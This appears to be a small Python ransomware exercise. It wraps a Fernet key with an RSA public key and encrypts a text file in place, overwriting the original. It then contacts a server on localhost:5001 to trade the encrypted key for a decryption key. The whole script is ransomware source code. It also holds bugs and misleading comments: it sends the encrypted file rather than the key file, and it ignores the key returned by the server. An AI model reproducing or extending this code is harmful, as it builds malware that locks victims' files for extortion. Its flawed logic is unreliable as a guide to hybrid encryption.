from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import socket

#creating my symmetric key
symmetricKey  = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)

#gets my public key
with open("./keys/public_key.key", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read(),
        backend=default_backend()
    )

#Encrypts my the public key with the symmertic key
encryptedSymmetricKey = public_key.encrypt(
    symmetricKey,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )   
)      

#Creates a file and writes the encrypted public key from above into the encryptedSymmertickey.key file
with open("./keys/encryptedSymmertricKey.key", "wb") as key_file:
    key_file.write(encryptedSymmetricKey)

print("Encrypted symmetric key")
print(encryptedSymmetricKey)

#Finding the target file to encrypt
filePath = "./Textfile/FileToEncrypt.txt"


#takes the target file reads and encrypts it
with open(filePath, "rb") as file:
    file_data = file.read()
    encrypted_data = FernetInstance.encrypt(file_data)

#Over writes the target file with the encrypted info
with open(filePath, "wb") as file:
    file.write(encrypted_data)


#sending the info over to the server
def sendEncryptedKey(eKeyFilePath):
   with socket.create_connection(("localhost", "5001")) as sock:
          with open(eKeyFilePath, "rb") as file:
            #basically opening the symmetrickey and sending the content over to server
            file_data=file.read()
            sock.send(file_data)
            #gets the decrypted key from the server
            key=sock.recv(1024).strip()
            #call the decryptFile Function 
            decryptFile(eKeyFilePath,key)


def decryptFile(filePath, key):
    with open(filePath,"rb") as filedata:
        file_data=filedata.read()
    decrypted_data=FernetInstance.decrypt(file_data)
    with open("./Textfile/decryptedtext.txt","wb") as file:
        file.write(decrypted_data)


sendEncryptedKey(filePath)
    

quit()